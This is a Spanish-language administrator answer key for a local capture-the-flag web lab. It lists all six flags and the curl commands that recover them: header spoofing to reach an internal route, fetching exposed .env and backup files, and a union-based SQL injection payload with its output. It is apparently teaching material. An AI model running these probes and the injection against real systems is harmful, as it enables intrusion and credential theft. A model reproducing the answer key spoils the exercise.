# Guía de soluciones — Developer Secrets (DevCore Solutions)

> **Material del administrador. NO compartir con los participantes.**
> Contiene las seis banderas, las evidencias y los comandos completos. Todos los
> datos, personas, credenciales y secretos son **ficticios**.

Esta guía asume el laboratorio arrancado y accesible en `http://localhost:8080`.

```bash
cd /Users/ing_juan/Desktop/HTB-Labs/Developer-Secrets
docker compose up -d --build
```

---

## 0. Sistema de flags

Todas las peticiones pasan por nginx (`:8080`) y el API las proxya al servicio
interno `flags` (sin puerto publicado).

| Método | Ruta | Descripción |
|---|---|---|
| POST | `/api/flags/validate` | Valida una bandera y registra su nivel. |
| POST | `/api/flags/unlock` | Desbloquea un nivel (evidencia niveles 1-4; combo nivel 6). |
| GET | `/api/flags/progress` | Muestra niveles resueltos, puntuación y total. |
| POST | `/api/flags/reset` | Reinicia el progreso. |

Respuestas clave:

- Validación correcta (200):
  `{"valid": true, "level": 1, "points": 10, "message": "flag valida del nivel 1"}`
- Validación incorrecta (404):
  `{"valid": false, "message": "flag invalida"}`
- Desbloqueo correcto (200):
  `{"level": 1, "flag": "FLAG{RECON_COMPLETE}", "points": 10, "message": "nivel 1 desbloqueado"}`
- Evidencia incorrecta (403):
  `{"error": "evidencia incorrecta para este nivel"}`

Puntuación total: **170 puntos** (10 + 20 + 20 + 30 + 40 + 50).

---

## Nivel 1 — Reconocimiento (10 puntos)

**Evidencia esperada:** `dc-api-2024.11-rc2`
**Flag:** `FLAG{RECON_COMPLETE}`

El API inyecta el token de build en cada respuesta.

```bash
curl -sI http://localhost:8080/api/health
```

Salida esperada (cabeceras):

```
HTTP/1.1 200 OK
Server: nginx/1.27.5
X-DevCore-Build: dc-api-2024.11-rc2
X-Powered-By: Flask/3.0 (DevCore)
X-DevCore-Edge: nginx-edge-1
X-DevCore-FileServer: 1
```

El cuerpo también lo confirma:

```bash
curl -s http://localhost:8080/api/health
# {"build":"dc-api-2024.11-rc2","service":"devcore-api","status":"ok"}
```

Rutas adicionales de apoyo:

```bash
curl -s http://localhost:8080/api/
curl -s -H 'X-Forwarded-For: 127.0.0.1' http://localhost:8080/api/internal/recon-report
```

Desbloquear:

```bash
curl -s -X POST http://localhost:8080/api/flags/unlock \
  -H 'Content-Type: application/json' \
  -d '{"level":1,"evidence":"dc-api-2024.11-rc2"}'
```

Salida esperada:

```json
{"level":1,"flag":"FLAG{RECON_COMPLETE}","points":10,"message":"nivel 1 desbloqueado"}
```

**Verificación:** `POST /api/flags/validate` con `FLAG{RECON_COMPLETE}` debe devolver
`valid: true`, `level: 1`, `points: 10`.

---

## Nivel 2 — Enumeración de directorios (20 puntos)

**Evidencia esperada:** `devcore_archive_20241031.tar.gz`
**Flag:** `FLAG{DIRECTORY_DISCOVERED}`

`robots.txt` y `sitemap.xml` listan rutas; el borde tiene `autoindex on`.

```bash
curl -s http://localhost:8080/robots.txt
curl -s http://localhost:8080/sitemap.xml
curl -s http://localhost:8080/files/
curl -s http://localhost:8080/backup/
```

En `http://localhost:8080/backup/` se ve el archivo
`devcore_archive_20241031.tar.gz`. Su contenido (referencia):

```bash
tar -tzf vulnerable-files/backups/devcore_archive_20241031.tar.gz
# devcore_archive_20241031/
# devcore_archive_20241031/notes.txt
# devcore_archive_20241031/manifest.txt
```

Desbloquear:

```bash
curl -s -X POST http://localhost:8080/api/flags/unlock \
  -H 'Content-Type: application/json' \
  -d '{"level":2,"evidence":"devcore_archive_20241031.tar.gz"}'
```

Salida esperada:

```json
{"level":2,"flag":"FLAG{DIRECTORY_DISCOVERED}","points":20,"message":"nivel 2 desbloqueado"}
```

**Verificación:** validar `FLAG{DIRECTORY_DISCOVERED}` (nivel 2, 20 puntos).

---

## Nivel 3 — Exposición de información de desarrolladores (20 puntos)

**Evidencia esperada:** `s.ostermann`
**Flag:** `FLAG{DEVELOPER_EXPOSED}`

El alias aparece en el comentario HTML de `base.html`, en `/team` y en los documentos
internos servidos.

```bash
curl -s http://localhost:8080/ | grep -i 'Responsable del despliegue'
#   Responsable del despliegue: s.ostermann

curl -s http://localhost:8080/team
curl -s http://localhost:8080/files/internal/README-dev.md
curl -s http://localhost:8080/files/internal/team-notes.txt
curl -s http://localhost:8080/files/internal/repo-structure.txt
```

Desbloquear:

```bash
curl -s -X POST http://localhost:8080/api/flags/unlock \
  -H 'Content-Type: application/json' \
  -d '{"level":3,"evidence":"s.ostermann"}'
```

Salida esperada:

```json
{"level":3,"flag":"FLAG{DEVELOPER_EXPOSED}","points":20,"message":"nivel 3 desbloqueado"}
```

**Verificación:** validar `FLAG{DEVELOPER_EXPOSED}` (nivel 3, 20 puntos).

---

## Nivel 4 — Descubrimiento de secretos (30 puntos)

**Evidencia esperada:** `dc_live_9f4e2b7a6c8d1e3f5a7b9c2d4e6f8a0b`
**Flag:** `FLAG{SECRET_FOUND}`

La clave está fugada en varios recursos.

```bash
curl -s http://localhost:8080/.env
curl -s http://localhost:8080/files/config/.env.bak
curl -s http://localhost:8080/files/config/app-config.json
curl -s http://localhost:8080/files/config/database.yml.bak
curl -s http://localhost:8080/api/config
```

En `/api/config`, la entrada correspondiente:

```json
{"key":"DEVCORE_API_KEY","value":"dc_live_9f4e2b7a6c8d1e3f5a7b9c2d4e6f8a0b","is_secret":true}
```

Desbloquear:

```bash
curl -s -X POST http://localhost:8080/api/flags/unlock \
  -H 'Content-Type: application/json' \
  -d '{"level":4,"evidence":"dc_live_9f4e2b7a6c8d1e3f5a7b9c2d4e6f8a0b"}'
```

Salida esperada:

```json
{"level":4,"flag":"FLAG{SECRET_FOUND}","points":30,"message":"nivel 4 desbloqueado"}
```

**Verificación:** validar `FLAG{SECRET_FOUND}` (nivel 4, 30 puntos).

---

## Nivel 5 — Investigación de base de datos (40 puntos)

**Evidencia esperada:** no aplica (la bandera se lee de la base de datos).
**Flag:** `FLAG{DATABASE_COMPROMISED}`

Reconocimiento del esquema:

```bash
curl -s http://localhost:8080/api/config
curl -s http://localhost:8080/api/users
curl -s http://localhost:8080/files/backups/db_backup_20241028.sql.bak
```

La consulta vulnerable en `/api/search` concatena `q`:

```sql
SELECT id, name, status FROM projects WHERE name LIKE '%<q>%'
```

Payload union-based (tres columnas). Usar `-G --data-urlencode` para codificarlo:

```bash
curl -s -G 'http://localhost:8080/api/search' \
  --data-urlencode "q=' UNION SELECT level, flag, points::text FROM internal_flags -- -"
```

Salida esperada (extracto):

```json
{
  "query": "SELECT id, name, status FROM projects WHERE name LIKE '%' UNION SELECT level, flag, points::text FROM internal_flags -- -'",
  "count": 6,
  "results": [
    {"id": 1, "name": "Plataforma de gestion de proyectos", "status": "en produccion"},
    {"id": 2, "name": "Integracion contable Meridian", "status": "piloto"},
    {"id": 3, "name": "Tienda en linea Kubo", "status": "desarrollo"},
    {"id": 5, "name": "Rastreo de flotas Norte", "status": "planeacion"},
    {"id": 4, "name": "Portal de pacientes Andino", "status": "mantenimiento"},
    {"id": 5, "name": "FLAG{DATABASE_COMPROMISED}", "status": "40"}
  ]
}
```

Validar la bandera extraída:

```bash
curl -s -X POST http://localhost:8080/api/flags/validate \
  -H 'Content-Type: application/json' \
  -d '{"flag":"FLAG{DATABASE_COMPROMISED}"}'
```

Salida esperada:

```json
{"valid":true,"level":5,"points":40,"message":"flag valida del nivel 5"}
```

**Verificación:** `level: 5`, `points: 40`.

---

## Nivel 6 — Root / flag final (50 puntos)

**Flag:** `FLAG{DEVELOPER_SECRETS_ROOT}`

Se desbloquea enviando las cinco banderas anteriores **en orden**:

```bash
curl -s -X POST http://localhost:8080/api/flags/unlock \
  -H 'Content-Type: application/json' \
  -d '{"level":6,"flags":["FLAG{RECON_COMPLETE}","FLAG{DIRECTORY_DISCOVERED}","FLAG{DEVELOPER_EXPOSED}","FLAG{SECRET_FOUND}","FLAG{DATABASE_COMPROMISED}"]}'
```

Salida esperada:

```json
{"level":6,"flag":"FLAG{DEVELOPER_SECRETS_ROOT}","points":50,"message":"nivel 6 desbloqueado"}
```

Si el arreglo está desordenado o incompleto, el servicio responde `403`:

```json
{"error":"combinacion invalida","message":"se requieren las cinco flags anteriores en orden"}
```

**Verificación:** validar `FLAG{DEVELOPER_SECRETS_ROOT}` (nivel 6, 50 puntos).

---

## Tabla de banderas

| Nivel | Nombre | Evidencia | Flag | Puntos |
|---|---|---|---|---|
| 1 | Reconocimiento | `dc-api-2024.11-rc2` | `FLAG{RECON_COMPLETE}` | 10 |
| 2 | Enumeración de directorios | `devcore_archive_20241031.tar.gz` | `FLAG{DIRECTORY_DISCOVERED}` | 20 |
| 3 | Exposición de información de desarrolladores | `s.ostermann` | `FLAG{DEVELOPER_EXPOSED}` | 20 |
| 4 | Descubrimiento de secretos | `dc_live_9f4e2b7a6c8d1e3f5a7b9c2d4e6f8a0b` | `FLAG{SECRET_FOUND}` | 30 |
| 5 | Investigación de base de datos | (se lee de `internal_flags` vía SQLi) | `FLAG{DATABASE_COMPROMISED}` | 40 |
| 6 | Root / flag final | (las cinco banderas anteriores en orden) | `FLAG{DEVELOPER_SECRETS_ROOT}` | 50 |

---

## Validación de las seis banderas

Una por una:

```bash
curl -s -X POST http://localhost:8080/api/flags/validate \
  -H 'Content-Type: application/json' -d '{"flag":"FLAG{RECON_COMPLETE}"}'

curl -s -X POST http://localhost:8080/api/flags/validate \
  -H 'Content-Type: application/json' -d '{"flag":"FLAG{DIRECTORY_DISCOVERED}"}'

curl -s -X POST http://localhost:8080/api/flags/validate \
  -H 'Content-Type: application/json' -d '{"flag":"FLAG{DEVELOPER_EXPOSED}"}'

curl -s -X POST http://localhost:8080/api/flags/validate \
  -H 'Content-Type: application/json' -d '{"flag":"FLAG{SECRET_FOUND}"}'

curl -s -X POST http://localhost:8080/api/flags/validate \
  -H 'Content-Type: application/json' -d '{"flag":"FLAG{DATABASE_COMPROMISED}"}'

curl -s -X POST http://localhost:8080/api/flags/validate \
  -H 'Content-Type: application/json' -d '{"flag":"FLAG{DEVELOPER_SECRETS_ROOT}"}'
```

Respuesta esperada en cada caso:

```json
{"valid":true,"level":<n>,"points":<p>,"message":"flag valida del nivel <n>"}
```

Comprobación final del progreso:

```bash
curl -s http://localhost:8080/api/flags/progress
```

Salida esperada con los seis niveles resueltos:

```json
{"solved":[1,2,3,4,5,6],"score":170,"total_levels":6,"detail":[{"level":1,"points":10,"solved_at":"..."}]}
```

---

## Reiniciar el laboratorio

Para devolver el progreso a cero (por ejemplo, antes de una nueva sesión):

```bash
curl -s -X POST http://localhost:8080/api/flags/reset \
  -H 'Content-Type: application/json' -d '{}'
# {"status":"ok","message":"progreso reiniciado"}
```

Reinicio completo y reversible de los contenedores y volúmenes:

```bash
./scripts/reset.sh
```

---

## Notas para el administrador

- Las banderas **no** están en el código servido ni en los archivos descargables;
  viven en `flags/flags.json`, montado únicamente en el contenedor `flags`.
- `tests/security/test_leaks.py` y `tests/unit/test_evidence_consistency.py` verifican
  que no haya fugas y que cada evidencia sea descubrible.
- Ejecuta `./scripts/test.sh` para validar el laboratorio completo.
- Recuerda que `flags/flags.json` es material privado: no lo compartas con los
  participantes.
